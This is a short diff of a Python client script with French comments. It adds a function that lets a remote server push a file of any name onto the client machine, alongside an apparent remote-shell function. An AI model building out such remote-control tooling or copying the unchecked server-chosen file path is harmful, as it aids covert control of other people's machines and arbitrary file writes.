@@ -57,6 +57,32 @@ def upload(ssl_socket):
         requete_recue = "Aucun fichier trouvé"
     ssl_socket.send(requete_recue.encode())
 
+def receive_file(client_socket):
+    # Envoyer l'acquittement au serveur
+    client_socket.send(b'Ready to receive')
+    
+    # Recevoir le nom du fichier
+    filename = client_socket.recv(4096).decode()
+    
+    # Recevoir la taille du fichier
+    file_size = int(client_socket.recv(4096).decode())
+    
+    # Recevoir le fichier par morceaux de 4096 octets
+    try:
+        with open(filename, 'wb') as file:
+            bytes_received = 0
+            while bytes_received < file_size:
+                chunk = client_socket.recv(4096)
+                if not chunk:
+                    break
+                file.write(chunk)
+                bytes_received += len(chunk)
+        print(f"Le fichier {filename} a été reçu avec succès.")
+        client_socket.send(b'File received successfully')
+    except Exception as e:
+        print(f"Erreur lors de la réception du fichier {filename} : {str(e)}")
+        client_socket.send(b'Error receiving file')
+
 # Fonction permettant d'accepter un shell depuis le serveur
 def shell(ssl_socket):
     repertoire_actuel = os.getcwd()  # Stockage du répertoire actuel
